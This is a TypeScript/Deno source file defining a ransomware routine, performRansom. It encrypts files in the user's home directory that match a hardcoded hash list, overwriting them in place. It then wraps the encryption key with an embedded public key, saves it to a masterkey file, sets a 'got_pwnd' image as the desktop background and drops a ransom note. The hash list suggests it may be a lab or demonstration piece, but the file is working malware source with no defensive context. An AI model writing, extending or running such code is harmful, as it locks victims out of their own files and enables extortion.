import {
  encryptData,
  generateIV,
  generateSymmetricKey,
  getHash,
  importPublicKeyFromPem,
  wrapSymmetricKey,
} from "../../utils/crypto.ts";
import {
  getHomedir,
  getImagePath,
  getMasterkeyPath,
  getNotePath,
  runForFiles,
} from "../../utils/path_utils.ts";
import image from "./got_pwnd.png#denoRawImport=bytes.ts" with {
  type: "bytes",
};
import noteText from "./ransom-note.txt#denoRawImport=text.ts" with {
  type: "text",
};
import publicKeyText from "../../public_key.pem#denoRawImport=text.ts" with {
  type: "text",
};
import { getBackground, setBackground } from "../../utils/cmd_utils.ts";

export async function performRansom() {
  const homedir = getHomedir();
  if (!homedir) {
    return;
  }
  const publicKey = await importPublicKeyFromPem(publicKeyText);
  const symmetricKey = await generateSymmetricKey();

  const hashes = [
    "04c1d98f904795e2a447f63c831eb5afb364001b",
    "7e4fd918e1807982f1d5e075498fb965e4521b30",
    "11b9eb2e8d6b3ae376dd8f0db33404dfdddcbf00",
  ];

  const newHashes = new Map<string, string>();

  const iv = generateIV();

  await runForFiles(homedir, hashes, async (entry, hash, data) => {
    const encryptedData = await encryptData(data, symmetricKey, iv);
    const newHash = await getHash(encryptedData);
    newHashes.set(hash, newHash);
    Deno.writeFileSync(entry.path, new Uint8Array(encryptedData));
    console.log(`Encrypted file with hash ${hash}`);
  });

  const key = await wrapSymmetricKey(symmetricKey, publicKey).then((data) =>
    new Uint8Array(data).toBase64()
  );
  const changedHashes = Object.fromEntries(newHashes);
  const base64iv = iv.toBase64();
  const background = getBackground();
  const masterkey = {
    key,
    iv: base64iv,
    changedHashes,
    background,
  };

  const masterkeyPath = getMasterkeyPath(homedir);

  Deno.writeTextFileSync(
    masterkeyPath,
    JSON.stringify(masterkey, null, 2),
  );

  const imagePath = getImagePath(homedir);
  Deno.writeFileSync(imagePath, image);
  setBackground(`file://${imagePath}`);

  const notePath = getNotePath(homedir);
  Deno.writeTextFileSync(notePath, noteText);
}
